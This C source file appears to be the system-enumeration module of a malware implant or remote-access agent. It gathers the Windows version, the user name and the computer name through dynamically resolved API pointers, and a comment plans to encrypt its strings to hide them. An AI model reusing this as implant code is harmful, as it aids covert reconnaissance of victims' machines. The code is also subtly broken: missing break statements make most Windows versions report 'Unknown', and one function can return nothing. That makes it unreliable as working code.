#include "enum.h"

//TODO finish enumeration

BOOL Enumerate(pAgent agent)
{
	//TODO: this may be an issue since we're not allocating memory manually & copying it into buffer.
	agent->OperatingSystem = GetOperatingSystemFunc(agent);
	agent->UserName = GetUser(agent);
	agent->ComputerName = GetCompName(agent);
	return TRUE;
}

//TODO replacee all strings with encoded / encrypted content.
LPSTR GetOperatingSystemFunc(pAgent agent) {
	LPCSTR OS = NULL;
	RTL_OSVERSIONINFOEXW lpVersionInformation = { 0 };
	lpVersionInformation.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
	NTSTATUS status = 0;
	status = agent->pRtlGetVersion(&lpVersionInformation);
	if (status != NTSUCCESS) {
		printf("[error] attempting to retrieve the operating system versions. [%08X]", status);
		return OS;
	}

	//determine which OS we're using
	switch (lpVersionInformation.dwMajorVersion) {
	//incase we're windows 10 OS.
	case 10:

		switch (lpVersionInformation.wProductType)
		{
		case VER_NT_WORKSTATION:
			OS = "Windows 10";
			break;
		default :
			OS = "Windows Server 2016";
			break;
		}
		break;

	//incase we're windwos 8 OS. / 7 / vista
	case 6:
		switch (lpVersionInformation.dwMinorVersion)
		{
			//windows 8.1 / serverr 2012 r2
		case 3:
			switch (lpVersionInformation.wProductType)
			{
			case VER_NT_WORKSTATION:
				OS = "Windows 8.1";
				break;
			default: 
				OS = "Windows Server 2012 R2";
				break;
			}
			break;

			// windows 8 / server 2012
		case 2:
			switch (lpVersionInformation.wProductType)
			{
			case VER_NT_WORKSTATION:
				OS = "Windows 8";
				break;
			default:
				OS = "Windows Server 2012";
				break;
			}
			break;

			//windows 7 / 2008 r2
		case 1:
			switch (lpVersionInformation.wProductType)
			{
			case VER_NT_WORKSTATION:
				OS = "Windows 7";
				break;
			default:
				OS = "Windows Server 2008 R2";
				break;
			}
			break;

			// windows Vista / 2008
		default:
			switch (lpVersionInformation.wProductType)
			{
			case VER_NT_WORKSTATION:
				OS = "Windows Vista";
				break;
			default:
				OS = "Windows Server 2008";
				break;
			}
			break;

		}// case 6 dwMinorVersion

		//Windows Server 2003 / Home Server / 2003 r2 / XP / XP Pro / 2000
	case 5:
		switch (lpVersionInformation.dwMinorVersion)
		{
		case 2:
			if (agent->pGetSystemMetrics(SM_SERVERR2) != 0)
			{
				OS = "Windows Server 2003 R2";
				break;
			}
			else if (lpVersionInformation.wSuiteMask & VER_SUITE_WH_SERVER)
			{
				OS = "Windows Home Server";
				break;
			}
			else if (agent->pGetSystemMetrics(SM_SERVERR2) == 0)
			{
				OS = "Windows Server 2003";
				break;
			}
			else
			{
				OS = "WIndows XP Professional x64 Edition";
				break;
			}
			break;
		case 1:
			OS = "Windows XP";
			break;
		case 0:
			OS = "Windows 2000";
			break;
		}//case 5 dwMinorVersion

	default:
		OS = "Unknown";
		break;
	}
	
	return OS;
}


LPSTR GetUser(pAgent agent) {
	PVOID            Data = NULL;
	DWORD            dwLength = UNLEN + 1;

	if (Data = LocalAlloc(LPTR, dwLength)) {
		agent->pGetUserNameA(Data, &dwLength);
	}
	
	return Data;
}


//TODO replace this with a function that obtians comptuer name from registry or from env variables.
LPSTR GetCompName(pAgent agent) {
	PVOID            Data = NULL;
	SIZE_T           Length = 0;
	DWORD            dwLength = 0;

	if (!agent->pGetComputerNameExA(ComputerNameNetBIOS, NULL, &dwLength))
	{
		if ((Data = LocalAlloc(LPTR, dwLength)))
		{
			if (agent->pGetComputerNameExA(ComputerNameNetBIOS, Data, &dwLength))
			{
				return Data; // this may return nothing. if having issues pass a buffer to copy the memory to.
				//returning this way actually will give us two locations where our computer name will exist. In the heap & in the buffer location in our agent.
				//freeing this section after use will negate this however, we need to pass our agent into the function for that. Cpy the mem then deallocate.
			}
		}
	}

	
}